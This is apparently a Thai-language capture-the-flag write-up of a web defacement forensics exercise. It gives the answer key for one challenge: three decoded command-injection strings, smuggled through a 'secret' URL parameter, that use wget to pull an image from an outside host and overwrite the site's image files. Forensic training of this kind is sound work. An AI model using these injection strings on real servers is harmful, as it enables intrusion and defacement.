# CyberWars TTX Write-up: ThaiCERT_WebDefacement

## Challenges Solved

### ID 212: Web Defacement-09
**Question:** คำสั่งที่ผู้ไม่หวังดีใช้เพื่อ upload ไฟล์รูปไปยัง path ที่เก็บรูปของเว็บ ThaiCERT คืออะไร? ให้ตอบในรูปแบบ Decode และให้คั่นด้วย , โดยให้เรียงลำดับตาม Timestamp ตัวอย่างเช่น (ping 8.8.8.8, ping 1.1.1.1)
**Answer:** `;wget -O ./assets/img/pic1.webp http://103.124.60.4:8000/pudpe.webp;, ;wget -O ./assets/img/pic2.webp http://103.124.60.4:8000/pudpe.webp;, ;wget -O ./assets/img/pic3.webp http://103.124.60.4:8000/pudpe.webp;`
**Investigation:**
จากการตรวจสอบ Access Log พบการส่งคำสั่งผ่านพารามิเตอร์ `secret` ในรูปแบบ URL Encoded ซึ่งเมื่อถอดรหัสออกมาจะพบชุดคำสั่ง `wget` ที่ใช้ดาวน์โหลดไฟล์ภาพจากเซิร์ฟเวอร์ภายนอก (`103.124.60.4:8000`) มาทับไฟล์ภาพเดิมในไดเรกทอรี `./assets/img/`
